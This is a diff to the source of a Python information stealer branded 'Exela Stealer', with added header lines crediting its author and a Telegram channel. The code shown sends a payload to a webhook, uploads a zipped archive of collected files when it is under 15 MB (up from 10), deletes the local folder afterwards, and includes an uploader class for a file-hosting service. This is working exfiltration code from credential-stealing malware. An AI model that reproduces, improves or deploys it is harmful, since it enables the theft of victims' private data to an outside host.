@@ -1,3 +1,7 @@
+# Exela Stealer All Rights Recieved
+# Coded by quicaxd
+# https://t.me/ExelaStealer
+
 import ctypes, platform
 import json, sys
 import shutil
@@ -1875,7 +1879,7 @@ class Main:
             async with session.post(webhook, json=payload, headers=headers) as response:
                 pass
             await self.SendContains()
-            if not os.path.getsize(filePath + ".zip") / (1024 * 1024) > 10:
+            if not os.path.getsize(filePath + ".zip") / (1024 * 1024) > 15:
                 with open(filePath + ".zip", 'rb') as file:
                     dosya_verisi = file.read()
                 payload = aiohttp.FormData()
@@ -1907,9 +1911,7 @@ class Main:
                 shutil.rmtree(filePath)
             except:
                 pass
-            
-
-
+        
 class UploadGoFile:
     @staticmethod
     async def GetServer() -> str:
